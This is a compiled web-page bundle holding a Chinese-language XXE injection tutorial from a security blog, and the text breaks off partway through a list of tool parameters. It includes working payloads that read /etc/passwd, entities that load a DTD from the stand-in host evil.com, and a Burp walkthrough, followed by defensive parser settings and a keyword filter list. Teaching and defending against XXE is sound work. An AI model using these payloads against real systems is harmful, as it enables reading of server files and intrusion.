(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[25],{155:function(e,a,t){"use strict";t.r(a),t.d(a,"default",(function(){return b}));t(130),t(0);var n=t(93);function s(){return(s=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function c(e,a){if(null==e)return{};var t,n,s=function(e,a){if(null==e)return{};var t,n,s={},c=Object.keys(e);for(n=0;n<c.length;n++)t=c[n],a.indexOf(t)>=0||(s[t]=e[t]);return s}(e,a);if(Object.getOwnPropertySymbols){var c=Object.getOwnPropertySymbols(e);for(n=0;n<c.length;n++)t=c[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(s[t]=e[t])}return s}var p={},o="wrapper";function b(e){var a=e.components,t=c(e,["components"]);return Object(n.b)(o,s({},p,t,{components:a,mdxType:"MDXLayout"}),Object(n.b)("h1",{className:"__internal",id:"xxe注入漏洞"},"XXE注入漏洞",Object(n.b)("a",s({parentName:"h1"},{href:"#xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h1",{className:"__internal",id:"xxe是什么？"},"XXE是什么？",Object(n.b)("a",s({parentName:"h1"},{href:"#xxe%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h2",{className:"__internal",id:"xml基础"},"XML基础",Object(n.b)("a",s({parentName:"h2"},{href:"#xml%E5%9F%BA%E7%A1%80","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型."),Object(n.b)("p",null,"是一种允许用户对自己的标记语言进行定义的源语言。"),Object(n.b)("p",null,"XML文档结构包括XML声明、DTD文档类型定义、文档元素。"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",s({parentName:"div"},{className:"language-html"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",s({parentName:"code"},{className:"token prolog"}),'<?xml version="1.0" ?>')," ",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--XML声明--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token doctype"}),"<!DOCTYPE note [\n<!ELEMENT note (to,from,heading,bodys)>"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"!ELEMENT")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"to")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"(#PCDATA)"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"!ELEMENT")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"from"),"  ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"(#PCDATA)"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"!ELEMENT")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"heading")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"(#PCDATA)"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"!ELEMENT")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"bodys")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"(#PCDATA)"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"\n]>",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--文档类型定义--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"note"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"\n\t",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"to"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"北京",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"to"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"from"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"石家庄",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"from"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"\n\t",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"heading"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"wintrysec",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"heading"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"bodys"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"wintrysec.github.io",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"bodys"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"note"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--文档元素--\x3e")))),Object(n.b)("p",null,"DTD(文档类型定义)的作用是定义xml文档的合法构建模块。"),Object(n.b)("p",null,"DTD 可以在 XML 文档内声明，也可以外部引用。"),Object(n.b)("p",null,"PCDATA 指的是被解析的字符数据（Parsed Character Data）"),Object(n.b)("p",null,"XML解析器通常会解析XML文档中所有的文本"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"xml"},Object(n.b)("pre",s({parentName:"div"},{className:"language-xml"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-xml"}),Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"message"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"此文本会被解析",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"message"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,"当某个XML元素被解析时，其标签之间的文本也会被解析： "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"xml"},Object(n.b)("pre",s({parentName:"div"},{className:"language-xml"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-xml"}),Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"name"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"first"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"Bill",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"first"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"last"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"Gates",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"last"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"name"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",s({parentName:"div"},{className:"language-html"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--内部声明DTD--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token doctype"}),"<!DOCTYPE 根元素 [元素声明]>"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--引用外部DTD--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token doctype"}),"<!DOCTYPE 根元素 SYSTEM “文件名”>"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--或者--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token doctype"}),"<!DOCTYPE 根元素 PUBLIC “public_ID” “文件名”>"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。--\x3e"),"\n\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--内部声明实体--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"!ENTITY")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"实体名称")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),'“实体的值"'),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--引用外部实体--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"!ENTITY")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"实体名称")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"SYSTEM")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),'“URI"'),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--或者--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"!ENTITY")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"实体名称")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),"PUBLIC")," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),'“public_ID"')," ",Object(n.b)("span",s({parentName:"span"},{className:"token attr-name"}),'“URI"'),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("h2",{className:"__internal",id:"xml外部实体注入"},"XML外部实体注入",Object(n.b)("a",s({parentName:"h2"},{href:"#xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"注意："),"执行系统命令(安装expect扩展的PHP环境里才有)"),Object(n.b)("h2",{className:"__internal",id:"恶意引入外部实体的三种方式"},"恶意引入外部实体的三种方式",Object(n.b)("a",s({parentName:"h2"},{href:"#%E6%81%B6%E6%84%8F%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h4",{className:"__internal",id:"一、本地引入"},"一、本地引入",Object(n.b)("a",s({parentName:"h4"},{href:"#%E4%B8%80%E3%80%81%E6%9C%AC%E5%9C%B0%E5%BC%95%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"XML内容："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"xml"},Object(n.b)("pre",s({parentName:"div"},{className:"language-xml"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-xml"}),Object(n.b)("span",s({parentName:"code"},{className:"token prolog"}),'<?xml version="1.0" ?>')," ",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--XML声明--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token doctype"}),'<!DOCTYPE x[\n\t<!ENTITY wintrysec SYSTEM "file:///etc/passwd">'),"\n]>",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--文档类型定义--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"test"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"&wintrysec;",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"test"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--文档元素--\x3e")))),Object(n.b)("p",null,"一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;) "),Object(n.b)("h4",{className:"__internal",id:"二、远程引入"},"二、远程引入",Object(n.b)("a",s({parentName:"h4"},{href:"#%E4%BA%8C%E3%80%81%E8%BF%9C%E7%A8%8B%E5%BC%95%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"XML内容："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"xml"},Object(n.b)("pre",s({parentName:"div"},{className:"language-xml"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-xml"}),Object(n.b)("span",s({parentName:"code"},{className:"token prolog"}),'<?xml version="1.0" ?>')," ",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--XML声明--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token doctype"}),'<!DOCTYPE x[\n\t<!ENTITY %d SYSTEM "http://evil.com/evil.dtd">'),"\n\t%d;\n]>",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--文档类型定义--\x3e"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"test"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"&wintrysec;",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"test"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"\x3c!--文档元素--\x3e")))),Object(n.b)("p",null,"DTD文件(evil.dtd)内容："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"xml"},Object(n.b)("pre",s({parentName:"div"},{className:"language-xml"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-xml"}),'<!ENTITY wintrysec SYSTEM “file:///etc/passwd">'))),Object(n.b)("h4",{className:"__internal",id:"三、远程引入2"},"三、远程引入2",Object(n.b)("a",s({parentName:"h4"},{href:"#%E4%B8%89%E3%80%81%E8%BF%9C%E7%A8%8B%E5%BC%95%E5%85%A52","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"xml"},Object(n.b)("pre",s({parentName:"div"},{className:"language-xml"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-xml"}),Object(n.b)("span",s({parentName:"code"},{className:"token prolog"}),'<?xml version="1.0" ?>'),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token doctype"}),'<!DOCTYPE x SYSTEM "http://evil.com/evil.dtd">'),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"test"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"&wintrysec;",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"test"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,"另外，不同程序支持的协议不一样"),Object(n.b)("p",null," ",Object(n.b)("img",s({parentName:"p"},{src:"/post-pic/xxe/xml1.png",alt:null}))," "),Object(n.b)("p",null," 上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有"),Object(n.b)("p",null," ",Object(n.b)("img",s({parentName:"p"},{src:"/post-pic/xxe/xml2.png",alt:null}))," "),Object(n.b)("h1",{className:"__internal",id:"发现xxe漏洞"},"发现XXE漏洞",Object(n.b)("a",s({parentName:"h1"},{href:"#%E5%8F%91%E7%8E%B0xxe%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"寻找那些接受XML作为输入内容的端点。 "),Object(n.b)("p",null,"用Burp抓包，随便输入密码点击登录"),Object(n.b)("p",null,"观察应用程序的XML传输数据。"),Object(n.b)("p",null,"请求："),Object(n.b)("p",null,Object(n.b)("img",s({parentName:"p"},{src:"/post-pic/xxe/xmlr1.png",alt:"request"}))),Object(n.b)("p",null,"响应："),Object(n.b)("p",null,Object(n.b)("img",s({parentName:"p"},{src:"/post-pic/xxe/xmlp1.png",alt:"Response"}))),Object(n.b)("p",null,"应用程序正在解析XML内容，接受特定的输入，然后将其呈现给用户"),Object(n.b)("p",null,"修改请求的XML内容，重放"),Object(n.b)("p",null,Object(n.b)("img",s({parentName:"p"},{src:"/post-pic/xxe/xmlre1.png",alt:null}))),Object(n.b)("p",null,"我们在上面的请求中定义了一个名为wintrysec，值为 'wintrysec666' 的实体"),Object(n.b)("p",null,"根据响应报文得知，解析器已经解析了我们发送的XML实体，并将实体内容呈现出来了。"),Object(n.b)("p",null,"由此，可以确认，这个应用程序存在XXE漏洞。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"读取任意文件：")),Object(n.b)("p",null,"修改数据包内容为："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"xml"},Object(n.b)("pre",s({parentName:"div"},{className:"language-xml"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-xml"}),Object(n.b)("span",s({parentName:"code"},{className:"token prolog"}),'<?xml version="1.0"?>')," \n",Object(n.b)("span",s({parentName:"code"},{className:"token doctype"}),'<!DOCTYPE a [ \n    <!ENTITY wintrysec SYSTEM "file:///etc/passwd">')," \n]> \n",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"user"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"username"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"&wintrysec;",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"username"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"<"),"password"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),"123",Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"password"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",s({parentName:"code"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token tag"}),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"</"),"user"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,"重放， 成功读取",Object(n.b)("inlineCode",{parentName:"p"},"/etc/passwd"),"文件 "),Object(n.b)("p",null," ",Object(n.b)("img",s({parentName:"p"},{src:"/post-pic/xxe/xmlre2.png",alt:null}))," "),Object(n.b)("h1",{className:"__internal",id:"防御xxe攻击"},"防御XXE攻击",Object(n.b)("a",s({parentName:"h1"},{href:"#%E9%98%B2%E5%BE%A1xxe%E6%94%BB%E5%87%BB","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h4",{className:"__internal",id:"一、过滤用户提交的xml数据"},Object(n.b)("strong",{parentName:"h4"},"一、过滤用户提交的XML数据"),Object(n.b)("a",s({parentName:"h4"},{href:"#%E4%B8%80%E3%80%81%E8%BF%87%E6%BB%A4%E7%94%A8%E6%88%B7%E6%8F%90%E4%BA%A4%E7%9A%84xml%E6%95%B0%E6%8D%AE","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"xml"},Object(n.b)("pre",s({parentName:"div"},{className:"language-xml"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-xml"}),"关键字：\n<!DOCTYPE和<!ENTITY，SYSTEM"))),Object(n.b)("h4",{className:"__internal",id:"二、使用开发语言提供的禁用外部实体的方法"},Object(n.b)("strong",{parentName:"h4"},"二、使用开发语言提供的禁用外部实体的方法"),Object(n.b)("a",s({parentName:"h4"},{href:"#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%8F%90%E4%BE%9B%E7%9A%84%E7%A6%81%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E7%9A%84%E6%96%B9%E6%B3%95","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"PHP："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(n.b)("pre",s({parentName:"div"},{className:"language-php"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-php"}),Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"libxml_disable_entity_loader"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"code"},{className:"token boolean constant"}),"true"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),";")))),Object(n.b)("p",null,"JAVA:"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"java"},Object(n.b)("pre",s({parentName:"div"},{className:"language-java"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-java"}),Object(n.b)("span",s({parentName:"code"},{className:"token class-name"}),"DocumentBuilderFactory")," dbf ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token class-name"}),"DocumentBuilderFactory"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"newInstance"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),";"),"\ndbf",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"setExpandEntityReferences"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"code"},{className:"token boolean"}),"false"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),";")))),Object(n.b)("p",null,"Python："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"python"},Object(n.b)("pre",s({parentName:"div"},{className:"language-python"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-python"}),Object(n.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," lxml ",Object(n.b)("span",s({parentName:"code"},{className:"token keyword"}),"import")," etree\nxmlData ",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," etree",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"parse",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"xmlSource",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"etree",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"XMLParser",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"resolve_entities",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token boolean"}),"False"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")))),Object(n.b)("h1",{className:"__internal",id:"自动化xxe工具"},"自动化XXE工具",Object(n.b)("a",s({parentName:"h1"},{href:"#%E8%87%AA%E5%8A%A8%E5%8C%96xxe%E5%B7%A5%E5%85%B7","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("a",s({parentName:"p"},{href:"https://github.com/enjoiz/XXEinjector",target:"_blank"}),"XXEinjector"),"是一个使用Ruby编写的自动化xxe漏洞检测工具，"),Object(n.b)("p",null,"可以通过给定一个http请求的包，然后设置好好参数就会自动化的进行fuzz，"),Object(n.b)("p",null,"他会通过内置的规则进行自动化的测试，并且还支持二次注入（通过另一个请求触发漏洞）"),Object(n.b)("h4",{className:"__internal",id:"参数说明："},Object(n.b)("strong",{parentName:"h4"},"参数说明："),Object(n.b)("a",s({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E%EF%BC%9A","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("ul",null,Object(n.b)("li",s({parentName:"ul"},{className:"__internal"}),"host: 用于反向连接的 IP"),Object(n.b)("li",s({parentName:"ul"},{className:"__internal"}),"path: 要读取的文件或目录"),Object(n.b)("li",s({parentName:"ul"},{className:"__internal"}),"file: 原始有效的请求信息，可以使用 XXEINJECT 来指出 DTD 要注入的位置"),Object(n.b)("li",s({parentName:"ul"},{className:"__internal"}),"proxy: 代理服务器"),Object(n.b)("li",s({parentName:"ul"},{className:"__internal"}),"oob：使用的协议，支持 http/ftp/gopher"),Object(n.b)("li",s({parentName:"ul"},{className:"__internal"}),"phpfilter：使用 PHP filter 对要读取的内容进行 base64 